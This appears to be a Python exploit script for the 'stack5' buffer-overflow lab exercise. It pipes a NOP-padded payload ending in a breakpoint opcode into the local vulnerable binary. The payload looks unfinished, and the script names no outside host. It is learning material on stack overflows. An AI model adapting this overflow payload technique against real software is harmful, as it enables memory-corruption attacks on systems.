#!/usr/bin/python

from Opcoad import convert_opcode
from subprocess import Popen
from subprocess import PIPE
import os                                                                                        # os.path.join(), os.getcwd()
from struct import pack

BINARY_NAME = "stack5"


def main():
    # LOCAL VARIABLES
    currEnv = os.environ.copy()
    absBinFilename = os.path.join(os.getcwd(), BINARY_NAME)
    # shellCode = pack("I", 0x909090CC)
    shellCode = "909090CC"
    # payload = ("HarkRulz" * 8) + ("hark" * 3) + shellCode
    payload = "90" * 32 + "90" * 6 + shellCode
    commandList = []

    # VERIFY FILE    
    if not os.path.isfile(absBinFilename):
        raise IOError("{} not found".format(absBinFilename))

    # CONVERT PAYLOAD
    payload = convert_opcode(payload, "90")

    # RUN IT
    commandList.append(absBinFilename)
    binary = Popen(commandList, env = currEnv, stdin = PIPE)
    if binary is not None:
        binary.communicate(payload)

    # DONE
    return


if __name__ == "__main__":
    try:
        main()
    except Exception as err:
        print(repr(err))

